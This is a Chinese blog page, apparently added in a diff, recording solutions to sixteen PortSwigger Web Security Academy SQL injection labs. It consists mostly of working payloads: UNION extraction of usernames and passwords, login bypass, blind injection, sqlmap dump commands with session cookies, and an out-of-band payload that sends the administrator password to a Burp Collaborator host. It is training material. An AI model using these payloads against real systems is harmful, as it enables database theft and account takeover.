@@ -1,0 +1,362 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light /dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>burpsuite实验室sql注入通关记录 | h11ba1's blog</title><meta name="keywords" content="burpsuite实验室,sql注入"><meta name="author" content="h11ba1"><meta name="copyright" content="h11ba1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1.WHERE子句中的SQL注入漏洞允许检索隐藏数据抓包礼物分类按钮： payload: 1&#x2F;filter?category&#x3D;Corporate+gifts&amp;#x27;or+1&#x3D;1--+    2.SQL注入漏洞允许登录绕过登陆框万能密码payload: 1administrator&amp;#x27;--    3.SQL注入UNION攻击，确定查询返回的列数order by确定返回列数： payloa">
+<meta property="og:type" content="article">
+<meta property="og:title" content="burpsuite实验室sql注入通关记录">
+<meta property="og:url" content="http://example.com/2019/07/05/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4sql%E6%B3%A8%E5%85%A5%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="h11ba1&#39;s blog">
+<meta property="og:description" content="1.WHERE子句中的SQL注入漏洞允许检索隐藏数据抓包礼物分类按钮： payload: 1&#x2F;filter?category&#x3D;Corporate+gifts&amp;#x27;or+1&#x3D;1--+    2.SQL注入漏洞允许登录绕过登陆框万能密码payload: 1administrator&amp;#x27;--    3.SQL注入UNION攻击，确定查询返回的列数order by确定返回列数： payloa">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2019/07/05/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4sql%E6%B3%A8%E5%85%A5%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.png">
+<meta property="article:published_time" content="2019-07-05T13:04:49.000Z">
+<meta property="article:modified_time" content="2021-07-18T10:52:11.986Z">
+<meta property="article:author" content="h11ba1">
+<meta property="article:tag" content="burpsuite实验室">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2019/07/05/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4sql%E6%B3%A8%E5%85%A5%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2019/07/05/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4sql%E6%B3%A8%E5%85%A5%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'burpsuite实验室sql注入通关记录',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-07-18 18:52:11'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="h11ba1's blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">34</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友情连接</span></a></li><li><a class="site-page child" href="/bangumis"><i class="fa-fw bangumis"></i><span> 番剧</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/2019/07/05/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4sql%E6%B3%A8%E5%85%A5%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">h11ba1's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友情连接</span></a></li><li><a class="site-page child" href="/bangumis"><i class="fa-fw bangumis"></i><span> 番剧</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">burpsuite实验室sql注入通关记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-07-05T13:04:49.000Z" title="发表于 2019-07-05 21:04:49">2019-07-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-07-18T10:52:11.986Z" title="更新于 2021-07-18 18:52:11">2021-07-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="burpsuite实验室sql注入通关记录"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="1-WHERE子句中的SQL注入漏洞允许检索隐藏数据"><a href="#1-WHERE子句中的SQL注入漏洞允许检索隐藏数据" class="headerlink" title="1.WHERE子句中的SQL注入漏洞允许检索隐藏数据"></a>1.WHERE子句中的SQL注入漏洞允许检索隐藏数据</h2><p>抓包礼物分类按钮：</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/filter?category=Corporate+gifts&#x27;or+1=1--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-SQL注入漏洞允许登录绕过"><a href="#2-SQL注入漏洞允许登录绕过" class="headerlink" title="2.SQL注入漏洞允许登录绕过"></a>2.SQL注入漏洞允许登录绕过</h2><p>登陆框万能密码payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">administrator&#x27;--</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="3-SQL注入UNION攻击，确定查询返回的列数"><a href="#3-SQL注入UNION攻击，确定查询返回的列数" class="headerlink" title="3.SQL注入UNION攻击，确定查询返回的列数"></a>3.SQL注入UNION攻击，确定查询返回的列数</h2><p>order by确定返回列数：</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Clothing%2c+shoes+and+accessories&#x27;order+by+§1§--+</span><br></pre></td></tr></table></figure>
+
+<p>爆破1，确定有三个字段</p>
+<p><img src="3.1.png" alt="3.1"></p>
+<h2 id="4-SQL注入UNION攻击，查找包含文本的列"><a href="#4-SQL注入UNION攻击，查找包含文本的列" class="headerlink" title="4.SQL注入UNION攻击，查找包含文本的列"></a>4.SQL注入UNION攻击，查找包含文本的列</h2><p>order by确定有三列</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union+select+null,null,null--+</span><br></pre></td></tr></table></figure>
+
+<p>一次确定第二个字段为String类型</p>
+<p>paylaod:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union+select+null,&#x27;aB4z0h&#x27;,null--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="5-SQL注入UNION攻击，从其他表中检索数据"><a href="#5-SQL注入UNION攻击，从其他表中检索数据" class="headerlink" title="5.SQL注入UNION攻击，从其他表中检索数据"></a>5.SQL注入UNION攻击，从其他表中检索数据</h2><p>确定产品分类处存在sql注入</p>
+<p>pyload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union+select+null,null--+</span><br></pre></td></tr></table></figure>
+
+<p>确定数据表有两列</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union+select+username,password+from+users--+</span><br></pre></td></tr></table></figure>
+
+<p>返回users表内容：</p>
+<p><img src="5.1.png" alt="5.1"></p>
+<h2 id="6-SQL注入UNION攻击，在单个列中检索多个值"><a href="#6-SQL注入UNION攻击，在单个列中检索多个值" class="headerlink" title="6.SQL注入UNION攻击，在单个列中检索多个值"></a>6.SQL注入UNION攻击，在单个列中检索多个值</h2><p>当只有一个列有返回值时，又想一次性查询多个数据可以尝试使用链接符</p>
+<p>不同数据库链接符：</p>
+<p>String concatenation</p>
+<p>You can concatenate together multiple strings to make a single string.</p>
+<table>
+<thead>
+<tr>
+<th>Oracle</th>
+<th>‘foo’||’bar’</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Microsoft</td>
+<td>‘foo’+’bar’</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td>‘foo’||’bar’</td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td>‘foo’ ‘bar’ [Note the space between the two strings]CONCAT(‘foo’,’bar’)</td>
+</tr>
+</tbody></table>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union+select+null,username+||+&#x27;~&#x27;+||+password+from+users--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="6.1.png" alt="6.1"></p>
+<h2 id="7-SQL注入攻击，在Oracle上查询数据库类型和版本"><a href="#7-SQL注入攻击，在Oracle上查询数据库类型和版本" class="headerlink" title="7.SQL注入攻击，在Oracle上查询数据库类型和版本"></a>7.SQL注入攻击，在Oracle上查询数据库类型和版本</h2><p>确定字段数量，和类型</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+UNION+SELECT+&#x27;abc&#x27;,&#x27;def&#x27;+FROM+DUAL--</span><br></pre></td></tr></table></figure>
+
+<p>oracle数据库查询数据时必须指定表</p>
+<p>查询数据库版本：</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union+select+banner,null+from+v$version--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="7.1.png" alt="7.1"></p>
+<h2 id="8-SQL注入攻击，在MySQL和Microsoft上查询数据库类型和版本"><a href="#8-SQL注入攻击，在MySQL和Microsoft上查询数据库类型和版本" class="headerlink" title="8.SQL注入攻击，在MySQL和Microsoft上查询数据库类型和版本"></a>8.SQL注入攻击，在MySQL和Microsoft上查询数据库类型和版本</h2><p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union+select+null,@@version--+</span><br></pre></td></tr></table></figure>
+
+<p>改查询语句再mssql和mysql上都适用</p>
+<p>也可使用:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union+select+null,version()--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="9-SQL注入攻击，列出非Oracle数据库上的数据库内容"><a href="#9-SQL注入攻击，列出非Oracle数据库上的数据库内容" class="headerlink" title="9.SQL注入攻击，列出非Oracle数据库上的数据库内容"></a>9.SQL注入攻击，列出非Oracle数据库上的数据库内容</h2><p>发现产品类型更改处存在sql注入，为了获取数据表的详细内容使用sqlmap</p>
+<p><strong>确定注入点：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  -u&quot;https://ac7e1f8e1eb3fd41800b077d005800b3.web-security-academy.net/filter?category=Accessories&quot; --dbs</span><br></pre></td></tr></table></figure>
+
+<p><strong>爆表：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  -u&quot;https://ac7e1f8e1eb3fd41800b077d005800b3.web-security-academy.net/filter?category=Accessories&quot;  --tables -D&quot;public&quot; --technique U  --technique U 使用union联合注入</span><br></pre></td></tr></table></figure>
+
+<p><strong>爆字段：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  -u&quot;https://ac7e1f8e1eb3fd41800b077d005800b3.web-security-academy.net/filter?category=Accessories&quot;  --columns -T&quot;users_ygohdx&quot; -D&quot;public&quot; --technique U</span><br></pre></td></tr></table></figure>
+
+<p><strong>爆字段内容：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  -u&quot;https://ac7e1f8e1eb3fd41800b077d005800b3.web-security-academy.net/filter?category=Accessories&quot;  --dump -T&quot;users_ygohdx&quot; -D&quot;public&quot; --technique U –force-ssl –force-ssl 强制为ssl链接</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="10-SQL注入攻击，列出Oracle上的数据库内容"><a href="#10-SQL注入攻击，列出Oracle上的数据库内容" class="headerlink" title="10.SQL注入攻击，列出Oracle上的数据库内容"></a>10.SQL注入攻击，列出Oracle上的数据库内容</h2><p>产品类别处存在sql注入</p>
+<p>并且已经知道数据库为oracle,并且可以使用union 联合注入</p>
+<ol>
+<li>确定数据库版本：</li>
+</ol>
+<p>paylaod:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/filter?category=Accessories&#x27;union+select+banner,&#x27;abc&#x27;+from+v$version--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="10.1.png" alt="10.1"></p>
+<h2 id="11-带条件错误的盲SQL注入"><a href="#11-带条件错误的盲SQL注入" class="headerlink" title="11.带条件错误的盲SQL注入"></a>11.带条件错误的盲SQL注入</h2><p>确定cookie中的TrackingId 能够sql注入</p>
+<p>判断语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=9pD3eC5YpJtrML6B&#x27; +UNION+SELECT+CASE+WHEN+(1=2)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+dual--</span><br></pre></td></tr></table></figure>
+
+<p>返回正确页面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=9pD3eC5YpJtrML6B&#x27; +UNION+SELECT+CASE+WHEN+(1=1)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+dual--</span><br></pre></td></tr></table></figure>
+
+<p>返回错误页面</p>
+<p>判断可以布尔盲注</p>
+<p>注入语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=&#x27;+UNION+SELECT+CASE+WHEN+(username=&#x27;administrator&#x27; +AND+substr(password,1,1)=&#x27;§a§&#x27;)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--</span><br></pre></td></tr></table></figure>
+
+<p><img src="11.1.png" alt="10.1"></p>
+<h2 id="12-带条件响应的盲SQL注入"><a href="#12-带条件响应的盲SQL注入" class="headerlink" title="12.带条件响应的盲SQL注入"></a>12.带条件响应的盲SQL注入</h2><p>cookie中的TrackingId存在布尔盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=qjuCxOqaqliFBZIo&#x27;+and+1=1--</span><br></pre></td></tr></table></figure>
+
+<p>响应中含有welocme back</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=qjuCxOqaqliFBZIo&#x27;+and+1=2--</span><br></pre></td></tr></table></figure>
+
+
+
+<p>响应中不含有welocme back</p>
+<p>可以使用sqlmap进行布尔盲注：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u&quot;https://acdc1ff31e4b36ba8046046200ae00da.web-security-academy.net&quot;  --cookie=&quot;TrackingId=qjuCxOqaqliFBZIo; session=P4r9aqFAWSWvfrR3BXV2vQ0WtRFbOU7i&quot;  --level 2 --skip=&quot;session&quot; --string=&quot;Welcome back&quot;  --dump -T&quot;users&quot; -D&quot;public&quot;  --technique B --force-ssl</span><br></pre></td></tr></table></figure>
+
+<p><img src="12.1.png" alt="12.1"></p>
+<h2 id="13-具有时间延迟的盲SQL注入"><a href="#13-具有时间延迟的盲SQL注入" class="headerlink" title="13.具有时间延迟的盲SQL注入"></a>13.具有时间延迟的盲SQL注入</h2><p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=gWHaxg2leLivbANe&#x27;||pg_sleep(10)--;</span><br></pre></td></tr></table></figure>
+
+<p>|| == and </p>
+<p>pg_sleep(10)</p>
+<p>postGreSQL数据库延时注入方法。</p>
+<h2 id="14-具有时间延迟和信息检索功能的盲SQL注入"><a href="#14-具有时间延迟和信息检索功能的盲SQL注入" class="headerlink" title="14.具有时间延迟和信息检索功能的盲SQL注入"></a>14.具有时间延迟和信息检索功能的盲SQL注入</h2><p>sqlmap payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u&quot;https://ac581f491ff33d44807531df001d00fe.web-security-academy.net&quot;  </span><br><span class="line">--cookie=&quot;TrackingId=hjrXeFvnCSwTXMSZ; session=hhrXoZA0Nd5vDcIIsz8AjFG3o640sOdu&quot;  </span><br><span class="line">--level 2 </span><br><span class="line">--skip=&quot;session&quot; --technique T --force-ssl --dbms &quot;PostgreSQL&quot;  </span><br><span class="line">--proxy=&quot;http://127.0.0.1:10809&quot;  </span><br><span class="line">--dump -T&quot;users&quot; -D&quot;public&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="15-带外交互的盲SQL注入"><a href="#15-带外交互的盲SQL注入" class="headerlink" title="15.带外交互的盲SQL注入"></a>15.带外交互的盲SQL注入</h2><p>因为是oracle数据库</p>
+<p>使用paylaod:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=x&#x27;+UNION+SELECT+extractvalue(xmltype(&#x27;&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//x.burpcollaborator.net/&quot;&gt;+%25remote%3b]&gt;&#x27;),&#x27;/l&#x27;)+FROM+dual--</span><br></pre></td></tr></table></figure>
+
+
+
+<p>各类型数据库带外交互语句：</p>
+<table>
+<thead>
+<tr>
+<th>Oracle</th>
+<th>The following technique leverages an XML external entity (<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe">XXE</a>) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:SELECT extractvalue(xmltype(‘<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]&gt;’),’/l’) FROM dual The following technique works on fully patched Oracle installations, but requires elevated privileges:SELECT UTL_INADDR.get_host_address(‘YOUR-SUBDOMAIN-HERE.burpcollaborator.net’)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Microsoft</td>
+<td>exec master..xp_dirtree ‘//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a’</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td>copy (SELECT ‘’) to program ‘nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net’</td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td>The following techniques work on Windows only:LOAD_FILE(‘\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a’)SELECT … INTO OUTFILE ‘\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a’</td>
+</tr>
+</tbody></table>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></p>
+<h2 id="16-带外数据渗透的盲SQL注入"><a href="#16-带外数据渗透的盲SQL注入" class="headerlink" title="16.带外数据渗透的盲SQL注入"></a>16.带外数据渗透的盲SQL注入</h2><p>oracle数据库带外交互泄露数据</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=wSR0EMmzIveEzi7k&#x27;+UNION+SELECT+extractvalue(xmltype(&#x27;&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//&#x27;||(SELECT+password+FROM+users+WHERE+username%3d&#x27;administrator&#x27;)||&#x27;.n6uac1qxzsv0xqtqk04q6v0zyq4js8.burpcollaborator.net/&quot;&gt;+%25remote%3b]&gt;&#x27;),&#x27;/l&#x27;)+FROM+dual--</span><br></pre></td></tr></table></figure>
+
+<p><img src="16.1.png" alt="16.1"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">h11ba1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2019/07/05/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4sql%E6%B3%A8%E5%85%A5%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/">http://example.com/2019/07/05/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4sql%E6%B3%A8%E5%85%A5%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">h11ba1's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4/">burpsuite实验室</a><a class="post-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a></div><div class="post_share"><div class="social-share" data-image="/2019/07/05/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4sql%E6%B3%A8%E5%85%A5%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/alipay.png" target="_blank"><img class="post-qr-code-img" src="/img/alipay.png" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a 